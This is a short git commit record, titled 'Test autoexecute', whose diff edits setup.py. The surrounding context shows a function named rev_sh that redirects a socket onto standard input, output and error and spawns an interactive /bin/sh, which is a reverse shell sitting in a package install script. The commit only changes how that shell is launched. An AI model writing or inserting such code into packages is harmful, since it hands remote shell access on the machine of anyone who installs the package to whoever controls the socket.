6a682cff2442d549b597a78d81f9d0085a65031c
Almir Junior <almir.junior.dev@outlook.com>
2021-08-22 20:58:09 -0400

    Test autoexecute

--- setup.py
+++ setup.py
@@ -35,7 +35,7 @@ def rev_sh():
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])
+    p=subprocess.Popen(["/bin/sh","-i"],stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 def touch_file():
     try:
